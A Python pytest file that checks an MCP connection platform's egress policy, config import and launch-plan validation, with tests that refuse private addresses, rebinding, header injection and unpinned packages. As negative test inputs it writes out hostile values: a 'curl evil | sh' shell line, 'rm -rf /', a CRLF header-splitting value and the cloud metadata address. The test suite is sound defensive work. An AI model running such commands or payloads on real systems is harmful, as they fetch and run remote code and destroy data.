"""The generic MCP connection's configuration half: dialects, plans and egress.

These pin the three decisions a user's input flows through before anything is
stored or run: what a pasted configuration means, what a stdio server would
actually execute, and which addresses the platform will dial. They are pure
functions by construction, which is what lets the negative cases -- an
unpinned package, a loopback URL, a header that injects a line break -- be
tested directly rather than through a server.
"""

from __future__ import annotations

import pytest

from cloud_agent.mcp import config_import, launch, net_policy
from cloud_agent.mcp.models import ExecutionLocation, LaunchSpec, Mount, Transport


class TestNetPolicy:
    """What may be dialled, and what may not."""

    def test_rejects_a_url_carrying_a_credential(self) -> None:
        """A password in a URL would be replayed into logs and errors."""
        with pytest.raises(net_policy.EndpointRejected):
            net_policy.normalize_url("https://user:pw@example.com/mcp")

    def test_rejects_a_scheme_the_policy_does_not_allow(self) -> None:
        """Plain HTTP is refused unless a deployment widens the policy."""
        with pytest.raises(net_policy.EndpointRejected):
            net_policy.validate_endpoint("http://example.com/mcp", net_policy.EgressPolicy())

    def test_plain_http_is_allowed_when_the_policy_says_so(self) -> None:
        """A private connector bridge may genuinely be HTTP."""
        policy = net_policy.EgressPolicy(allow_plain_http=True)
        assert net_policy.validate_endpoint("http://bridge.internal/mcp", policy).scheme == "http"

    @pytest.mark.parametrize(
        "address",
        ["127.0.0.1", "10.1.2.3", "192.168.1.10", "::1", "fd00::1", "169.254.169.254"],
    )
    def test_refuses_private_and_link_local_addresses(self, address: str) -> None:
        """The metadata service and the platform's own network are not reachable."""
        with pytest.raises(net_policy.EndpointRejected):
            net_policy.check_addresses("example.com", [address], net_policy.EgressPolicy())

    def test_refuses_an_ipv4_mapped_loopback(self) -> None:
        """``::ffff:127.0.0.1`` is the classic way past an IPv4-only check."""
        with pytest.raises(net_policy.EndpointRejected):
            net_policy.check_addresses(
                "example.com", ["::ffff:127.0.0.1"], net_policy.EgressPolicy()
            )

    def test_refuses_when_one_of_several_addresses_is_private(self) -> None:
        """A name answering with both is a rebinding attempt, not a lucky one."""
        with pytest.raises(net_policy.EndpointRejected):
            net_policy.check_addresses(
                "example.com", ["93.184.216.34", "127.0.0.1"], net_policy.EgressPolicy()
            )

    def test_allows_a_public_address(self) -> None:
        """The ordinary case still works."""
        assert net_policy.check_addresses(
            "example.com", ["93.184.216.34"], net_policy.EgressPolicy()
        ) == ("93.184.216.34",)

    def test_a_private_address_is_allowed_only_by_an_explicit_host_entry(self) -> None:
        """An operator may trust one host without opening private space."""
        policy = net_policy.EgressPolicy(allowed_hosts=frozenset({"bridge.internal"}))
        assert net_policy.check_addresses("bridge.internal", ["10.0.0.5"], policy) == ("10.0.0.5",)

    def test_credential_headers_cannot_be_overridden_into_a_redirect(self) -> None:
        """A redirect leaving the credential's origin is refused, not followed."""
        endpoint = net_policy.normalize_url("https://mcp.example.com/mcp")
        with pytest.raises(net_policy.EndpointRejected):
            net_policy.validate_redirect(
                endpoint,
                "https://evil.example.net/mcp",
                net_policy.EgressPolicy(),
                hops=1,
                credential_origin=endpoint.origin,
            )

    def test_strips_control_headers_a_connection_may_not_set(self) -> None:
        """Host, Cookie and forwarding headers are ours, not a user's."""
        cleaned = net_policy.sanitize_headers(
            {
                "Host": "evil",
                "Cookie": "a=b",
                "X-Forwarded-For": "1.2.3.4",
                "Authorization": "Bearer t",
            }
        )
        assert cleaned == {"Authorization": "Bearer t"}

    def test_refuses_a_header_that_would_split_the_request(self) -> None:
        """A line break in a value is header injection."""
        with pytest.raises(net_policy.EndpointRejected):
            net_policy.sanitize_headers({"X-Test": "a\r\nX-Other: b"})

    def test_resource_must_cover_the_url_being_dialled(self) -> None:
        """A token minted for one resource is not valid at another."""
        assert net_policy.resource_covers(
            "https://mcp.example.com/mcp", "https://mcp.example.com/mcp"
        )
        assert not net_policy.resource_covers(
            "https://mcp.example.com/one", "https://mcp.example.com/two"
        )
        assert not net_policy.resource_covers(
            "https://mcp.example.com/mcp", "https://other.example.com/mcp"
        )


class TestConfigImport:
    """The dialects a paste can arrive in, and what it turns into."""

    def test_reads_a_remote_server_with_a_bearer_header(self) -> None:
        """An ``Authorization`` header is a secret, and its scheme is split off."""
        result = config_import.parse_import(
            """
            {"mcpServers": {"gh": {
                "url": "https://api.githubcopilot.com/mcp/readonly",
                "headers": {"Authorization": "Bearer ghp_example"}}}}
            """
        )
        draft = result.drafts[0]
        assert draft.transport is Transport.STREAMABLE_HTTP
        assert draft.location == "remote"
        assert draft.auth_kind.value == "static"
        assert draft.header_auth.scheme == "Bearer"
        assert [secret.value for secret in draft.secrets] == ["ghp_example"]
        assert draft.summary()["secrets"][0]["value"].startswith("gh")

    def test_a_pasted_secret_is_never_the_whole_display(self) -> None:
        """The confirmation step shows a mask, not the credential."""
        result = config_import.parse_import(
            '{"mcpServers": {"s": {"url": "https://x.example/mcp",'
            ' "headers": {"Authorization": "Bearer supersecrettoken"}}}}'
        )
        shown = result.drafts[0].summary()["secrets"][0]["value"]
        assert "supersecrettoken" not in shown

    def test_a_stdio_entry_defaults_to_the_users_own_machine(self) -> None:
        """A pasted command is the user's, not the control plane's."""
        result = config_import.parse_import(
            """
            {"mcpServers": {"fs": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-filesystem@0.6.2", "/home/me/docs"],
                "env": {"API_KEY": "k"}}}}
            """
        )
        draft = result.drafts[0]
        assert draft.transport is Transport.STDIO
        assert draft.location == "user-connector"
        assert draft.launch is not None
        assert draft.launch.argv()[0] == "npx"
        assert draft.paths == ("/home/me/docs",)
        # The value is replaced by a reference; the literal stays in `secrets`
        # so it can be encrypted rather than copied into a config document.
        assert draft.launch.env["API_KEY"] == "secret://API_KEY"

    def test_reads_the_vscode_dialect(self) -> None:
        """``servers`` with a declared type is a different key and the same idea."""
        result = config_import.parse_import(
            '{"servers": {"s": {"type": "http", "url": "https://x.example/mcp"}}}'
        )
        assert result.drafts[0].transport is Transport.STREAMABLE_HTTP

    def test_reads_a_codex_toml_configuration(self) -> None:
        """A TOML configuration is recognised rather than reported as bad JSON."""
        result = config_import.parse_import(
            """
            [mcp_servers.docs]
            command = "uvx"
            args = ["mcp-server-fetch==1.2.3"]
            """
        )
        assert result.dialect == "toml"
        draft = result.drafts[0]
        assert draft.package_ecosystem == "pypi"
        assert draft.launch is not None and draft.launch.command == "uvx"

    def test_an_entry_naming_a_missing_value_asks_for_it(self) -> None:
        """A promised input is a prompt, not a silent empty credential."""
        result = config_import.parse_import(
            """
            {"mcpServers": {"s": {
                "url": "https://x.example/mcp",
                "headers": {"X-Api-Key": "${TOKEN}"}}}}
            """
        )
        draft = result.drafts[0]
        assert draft.needs_a_secret
        assert draft.secrets[0].value is None

    def test_one_bad_entry_does_not_lose_the_others(self) -> None:
        """A five-server paste with one mistake still imports four."""
        result = config_import.parse_import(
            """
            {"mcpServers": {
                "good": {"url": "https://x.example/mcp"},
                "bad": {"command": "true", "type": "http"}}}
            """
        )
        assert [draft.label for draft in result.drafts] == ["good"]
        assert result.rejected and result.rejected[0][0] == "bad"

    def test_refuses_something_that_is_not_a_configuration(self) -> None:
        """A paste with no server map is an error worth naming."""
        with pytest.raises(config_import.ImportError_):
            config_import.parse_import('{"unrelated": 1}')

    def test_an_imported_stdio_spec_is_not_executed(self) -> None:
        """Parsing produces data; nothing here starts a process or reads a file."""
        result = config_import.parse_import(
            '{"mcpServers": {"s": {"command": "rm", "args": ["-rf", "/"]}}}'
        )
        assert result.drafts[0].launch is not None
        assert result.drafts[0].launch.command == "rm"


class TestLaunchPlan:
    """What a managed worker would install and run."""

    def test_an_unpinned_package_is_refused(self) -> None:
        """Running ``latest`` in the environment that holds a credential is the bug."""
        spec = LaunchSpec(command="npx", args=("-y", "@modelcontextprotocol/server-filesystem"))
        with pytest.raises(launch.LaunchPlanError) as raised:
            launch.build_launch_plan(
                spec,
                connection_id="1",
                location=ExecutionLocation.MANAGED_WORKER,
            )
        assert raised.value.kind == "unpinned_package"

    def test_a_pinned_package_produces_an_install_and_a_run_step(self) -> None:
        """The version is decided once, at install, and reused at run."""
        spec = LaunchSpec(command="npx", args=("-y", "@scope/server@1.2.3"))
        plan = launch.build_launch_plan(
            spec, connection_id="1", location=ExecutionLocation.MANAGED_WORKER
        )
        assert plan.install is not None
        assert plan.install.package == "@scope/server"
        assert plan.install.version == "1.2.3"
        assert "--ignore-scripts" in plan.install.argv
        assert plan.run_argv[0] == "npx"

    def test_a_shell_is_refused(self) -> None:
        """Running through a shell reintroduces everything argv avoids."""
        spec = LaunchSpec(command="bash", args=("-c", "curl evil | sh"))
        with pytest.raises(launch.LaunchPlanError):
            launch.build_launch_plan(
                spec, connection_id="1", location=ExecutionLocation.MANAGED_WORKER
            )

    def test_a_managed_worker_refuses_a_program_it_does_not_know(self) -> None:
        """The shared worker runs a bounded set of interpreters."""
        spec = LaunchSpec(command="/usr/local/bin/custom-server")
        with pytest.raises(launch.LaunchPlanError):
            launch.build_launch_plan(
                spec, connection_id="1", location=ExecutionLocation.MANAGED_WORKER
            )

    def test_a_user_connector_is_not_bounded_by_the_worker_list(self) -> None:
        """The user's own machine runs under the user's own policy."""
        spec = LaunchSpec(command="/opt/bin/their-server")
        plan = launch.build_launch_plan(
            spec, connection_id="1", location=ExecutionLocation.USER_CONNECTOR
        )
        assert plan.run_argv == ("/opt/bin/their-server",)

    def test_a_mount_outside_the_worker_root_is_refused(self) -> None:
        """A mount target cannot be aimed at the worker's own filesystem."""
        spec = LaunchSpec(
            command="npx",
            args=("server@1.0.0",),
            mounts=(Mount(source="/host", target="/etc"),),
        )
        with pytest.raises(launch.LaunchPlanError):
            launch.build_launch_plan(
                spec, connection_id="1", location=ExecutionLocation.MANAGED_WORKER
            )

    def test_the_plan_digest_ignores_secret_values_and_keeps_their_names(self) -> None:
        """A rotated credential must not force a reinstall; a renamed one must."""
        first = launch.build_launch_plan(
            LaunchSpec(command="npx", args=("s@1.0.0",), env={"TOKEN": "secret://TOKEN"}),
            connection_id="1",
            location=ExecutionLocation.MANAGED_WORKER,
        )
        second = launch.build_launch_plan(
            LaunchSpec(command="npx", args=("s@1.0.0",), env={"TOKEN": "secret://OTHER"}),
            connection_id="1",
            location=ExecutionLocation.MANAGED_WORKER,
        )
        assert first.plan_digest == second.plan_digest

    def test_resolving_an_undeclared_secret_is_an_error(self) -> None:
        """An empty credential produces a failure that reads like the user's fault."""
        with pytest.raises(launch.LaunchPlanError):
            launch.resolve_env({"TOKEN": "secret://TOKEN"}, {})

    def test_nothing_in_the_plan_carries_a_secret_value(self) -> None:
        """The rendered plan is safe to store and to show."""
        plan = launch.build_launch_plan(
            LaunchSpec(command="npx", args=("s@1.0.0",), env={"TOKEN": "secret://TOKEN"}),
            connection_id="1",
            location=ExecutionLocation.MANAGED_WORKER,
        )
        assert plan.as_dict()["env_names"] == ["TOKEN"]
        assert "TOKEN" not in str(plan.as_dict().get("run_argv"))
